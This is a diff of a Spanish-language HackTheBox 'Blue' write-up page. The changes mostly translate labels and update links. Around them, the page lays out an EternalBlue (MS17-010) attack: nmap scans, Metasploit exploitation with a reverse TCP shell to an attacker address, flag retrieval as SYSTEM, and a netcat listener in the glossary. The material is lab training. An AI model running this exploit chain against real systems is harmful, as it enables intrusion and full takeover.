@@ -106,7 +106,7 @@
     .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
     .badge-facil  { color: #00ffcc;  border-color: rgba(0,255,204,0.4);  background: rgba(0,255,204,0.05); }
     .badge-htb    { color: var(--green);  border-color: rgba(0,255,136,0.3);  background: rgba(0,255,136,0.05); }
-    .badge-win    { color: var(--blue);  border-color: rgba(79,195,247,0.3);  background: rgba(79,195,247,0.05); }
+    .badge-windows    { color: var(--blue);  border-color: rgba(79,195,247,0.3);  background: rgba(79,195,247,0.05); }
     .badge-cve    { color: var(--red);    border-color: rgba(255,45,85,0.4);   background: rgba(255,45,85,0.05); }
     .badge-msf    { color: var(--purple); border-color: rgba(191,95,255,0.3);  background: rgba(191,95,255,0.05); }
     .badge-nmap   { color: var(--orange); border-color: rgba(255,140,0,0.4);   background: rgba(255,140,0,0.05); }
@@ -140,7 +140,7 @@
     .val-red    { color: var(--red); }
     .val-facil  { color: #00ffcc; }
 
-    /* ATTACK PATH */
+    /* RUTA DE ATAQUE */
     .attack-path { display: flex; flex-direction: column; gap: 0; }
     .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
     .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
@@ -312,31 +312,32 @@
 <div class="cursor-ring" id="cursorRing"></div>
 
 <nav>
-  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
-  <a href="https://brandeiks.github.io/writeups/" class="nav-back">volver al portafolio</a>
-</nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <a href="../../../writeups/index.html" class="nav-back">ANÁLISIS</a>
+    <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+  </nav>
 
 <!-- HERO -->
 <div class="writeup-hero">
   <div class="hero-grid"></div>
   <div class="hero-glow"></div>
   <div class="writeup-hero-content">
-    <p class="breadcrumb">
-      <a href="https://brandeiks.github.io/">brandeiks</a> /
-      <a href="https://brandeiks.github.io/writeups/">writeups</a> /
-      <a href="https://brandeiks.github.io/writeups/">hackthebox</a> /
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">análisis</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
       <span>blue</span>
-    </p>
+    </div>
     <h1 class="writeup-title"><span>Blue</span></h1>
     <p class="writeup-subtitle">HackTheBox — Windows · Nmap → EternalBlue MS17-010 (CVE-2017-0144) → Metasploit → NT AUTHORITY\SYSTEM</p>
     <div class="writeup-meta">
       <span class="meta-badge badge-facil">● FÁCIL</span>
       <span class="meta-badge badge-htb">HACKTHEBOX</span>
-      <span class="meta-badge badge-win">WINDOWS 7</span>
+      <span class="meta-badge badge-windows">WINDOWS 7</span>
       <span class="meta-badge badge-cve">CVE-2017-0144</span>
       <span class="meta-badge badge-msf">METASPLOIT</span>
       <span class="meta-badge badge-nmap">NMAP</span>
-      <span class="meta-date">📅 Junio 2026 · By Brandeiks</span>
+      <span class="meta-date">📅 Junio 2026 · Por Brandeiks</span>
     </div>
   </div>
 </div>
@@ -365,12 +366,12 @@
       <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-green">HackTheBox</span></div>
       <div class="info-row"><span class="info-label">OS</span><span class="info-val val-blue">Windows 7 SP1</span></div>
       <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-facil">Fácil</span></div>
-      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">10.129.2.134</span></div>
+      <div class="info-row"><span class="info-label">IP objetivo</span><span class="info-val" style="color:var(--text)">10.129.2.134</span></div>
       <div class="info-row"><span class="info-label">CVE</span><span class="info-val val-red">CVE-2017-0144</span></div>
       <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
     </div>
     <div class="sidebar-box">
-      <p class="sidebar-title">// ATTACK PATH</p>
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
       <div class="attack-path">
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Nmap -sSCV</span> → puertos SMB abiertos</div></div>
         <div class="ap-line"></div>
@@ -432,7 +433,7 @@
           <tr><td>Detección de vulns</td><td>nmap --script vuln</td><td>MS17-010 VULNERABLE — CVE-2017-0144</td></tr>
           <tr><td>Investigación</td><td>CVE-2017-0144 (EternalBlue)</td><td>RCE crítico en SMBv1</td></tr>
           <tr><td>Explotación</td><td>msfconsole ms17_010_eternalblue</td><td>Shell como NT AUTHORITY\SYSTEM</td></tr>
-          <tr><td>Post-explot.</td><td>whoami / dir / type</td><td>User flag + Root flag obtenidas</td></tr>
+          <tr><td>Post-explot.</td><td>whoami / dir / type</td><td>Bandera de usuario + Bandera de root obtenidas</td></tr>
         </tbody>
       </table>
     </div>
@@ -461,7 +462,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 10.129.2.134 -oX blue.xml">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">NMAP</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p- -sSCV -n -Pn</span> <span class="flag">--min-rate=5000 --open</span> <span class="arg">10.129.2.134</span> <span class="flag">-oX</span> <span class="arg">blue.xml</span></span></div>
       </div>
@@ -520,7 +521,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl blue.xml > blue.html">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">XSLTPROC</span>
         <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">blue.xml</span> &gt; <span class="arg">blue.html</span></span></div>
       </div>
@@ -548,7 +549,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nmap -p 135,139,445,49152,49153,49154,49155,49156,49157 --script vuln --open 10.129.2.134 -oX blue_vuln.xml">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">NMAP VULN</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p</span> <span class="arg">135,139,445,49152,49153,49154,49155,49156,49157</span> <span class="flag">--script vuln --open</span> <span class="arg">10.129.2.134</span> <span class="flag">-oX</span> <span class="arg">blue_vuln.xml</span></span></div>
       </div>
@@ -586,7 +587,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl blue_vuln.xml > blue_vuln.html">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">XSLTPROC</span>
         <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">blue_vuln.xml</span> &gt; <span class="arg">blue_vuln.html</span></span></div>
       </div>
@@ -652,7 +653,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="msfconsole">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">MSF</span>
         <div><span class="prompt">$ </span><span class="cmd">msfconsole</span></div>
       </div>
@@ -663,7 +664,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="search eterna blue">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">MSF</span>
         <div><span class="prompt">msf &gt; </span><span class="cmd">search <span class="arg">eterna blue</span></span></div>
       </div>
@@ -686,7 +687,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="use 0">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">MSF</span>
         <div><span class="prompt">msf &gt; </span><span class="cmd">use <span class="arg">0</span></span></div>
         <div><span class="prompt">msf exploit(windows/smb/ms17_010_eternalblue) &gt; </span><span class="cmd">show options</span></div>
@@ -713,7 +714,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="set rhost 10.129.2.134">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">MSF</span>
         <div><span class="prompt">msf exploit(ms17_010_eternalblue) &gt; </span><span class="cmd">set <span class="flag">rhost</span> <span class="arg">10.129.2.134</span></span></div>
         <div><span class="o-green">rhost =&gt; 10.129.2.134</span></div>
@@ -734,20 +735,20 @@
       </div>
 
       <div class="cmd-block" data-cmd="show payloads">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">MSF</span>
         <div><span class="prompt">msf exploit(ms17_010_eternalblue) &gt; </span><span class="cmd">show payloads</span></div>
       </div>
 
       <div class="cmd-block" data-cmd="set payload 57">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">MSF</span>
         <div><span class="prompt">msf exploit(ms17_010_eternalblue) &gt; </span><span class="cmd">set <span class="flag">payload</span> <span class="arg">57</span></span></div>
         <div><span class="o-green">payload =&gt; windows/x64/shell/reverse_tcp</span></div>
       </div>
 
       <div class="cmd-block" data-cmd="set lhost 10.10.16.7">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">MSF</span>
         <div><span class="prompt">msf exploit(ms17_010_eternalblue) &gt; </span><span class="cmd">set <span class="flag">lhost</span> <span class="arg">10.10.16.7</span></span></div>
         <div><span class="o-green">lhost =&gt; 10.10.16.7</span></div>
@@ -759,7 +760,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="exploit">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">MSF</span>
         <div><span class="prompt">msf exploit(ms17_010_eternalblue) &gt; </span><span class="cmd">exploit</span></div>
       </div>
@@ -819,7 +820,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="cd.. && cd.. && cd.. && dir">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">WINDOWS</span>
         <div><span class="prompt">C:\Windows\system32&gt; </span><span class="cmd">cd..</span></div>
         <div><span class="prompt">C:\Windows&gt; </span><span class="cmd">cd..</span></div>
@@ -848,7 +849,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="cd Users && dir">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">WINDOWS</span>
         <div><span class="prompt">C:\&gt; </span><span class="cmd">cd <span class="arg">Users</span></span></div>
         <div><span class="prompt">C:\Users&gt; </span><span class="cmd">dir</span></div>
@@ -880,11 +881,11 @@
 
       <div class="step-marker">
         <div class="step-num">13</div>
-        <span class="step-title">USER FLAG — C:\Users\haris\Desktop\user.txt</span>
+        <span class="step-title">BANDERA DE USUARIO — C:\Users\haris\Desktop\user.txt</span>
       </div>
 
       <div class="cmd-block" data-cmd="cd haris && cd Desktop && type user.txt">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">WINDOWS</span>
         <div><span class="prompt">C:\Users&gt; </span><span class="cmd">cd <span class="arg">haris</span></span></div>
         <div><span class="prompt">C:\Users\haris&gt; </span><span class="cmd">cd <span class="arg">Desktop</span></span></div>
@@ -897,11 +898,11 @@
 
       <div class="step-marker">
         <div class="step-num">14</div>
-        <span class="step-title">ROOT FLAG — C:\Users\Administrator\Desktop\root.txt</span>
+        <span class="step-title">BANDERA DE ROOT — C:\Users\Administrator\Desktop\root.txt</span>
       </div>
 
       <div class="cmd-block" data-cmd="cd C:\Users\Administrator\Desktop && type root.txt">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">WINDOWS</span>
         <div><span class="prompt">C:\Users&gt; </span><span class="cmd">cd <span class="arg">Administrator</span></span></div>
         <div><span class="prompt">C:\Users\Administrator&gt; </span><span class="cmd">cd <span class="arg">Desktop</span></span></div>
@@ -914,11 +915,11 @@
 
       <div class="flags-grid">
         <div class="flag-card">
-          <div class="flag-label">// USER FLAG</div>
+          <div class="flag-label">// BANDERA DE USUARIO</div>
           <div class="flag-user">95fc8c38bc1714946bdb86d89ab84724</div>
         </div>
         <div class="flag-root-card">
-          <div class="flag-label">// ROOT FLAG</div>
+          <div class="flag-label">// BANDERA DE ROOT</div>
           <div class="flag-root">7dc3cd55355ebfc97ff8aaa75cceb57d</div>
         </div>
       </div>
@@ -1015,7 +1016,7 @@
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">Reverse Shell</div>
+          <div class="glos-term">Reverse shell</div>
           <div class="glos-def">Una <strong>reverse shell</strong> es una conexión donde la <em>máquina víctima</em> se conecta de vuelta hacia el <em>atacante</em>, en lugar del flujo normal. Esto permite evadir firewalls que bloquean conexiones entrantes: el firewall no bloquea las salientes. El atacante abre un listener (<code>nc -lvnp 4444</code> o Metasploit handler), y cuando el exploit se ejecuta, la víctima establece la conexión. El payload <code>windows/x64/shell/reverse_tcp</code> implementa este mecanismo.</div>
         </div>
 
@@ -1052,9 +1053,9 @@
 
 <!-- FOOTER -->
 <footer>
-  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
-  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
-</footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Análisis de Blue · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
 
 <script>
   // ACTIVE TOC
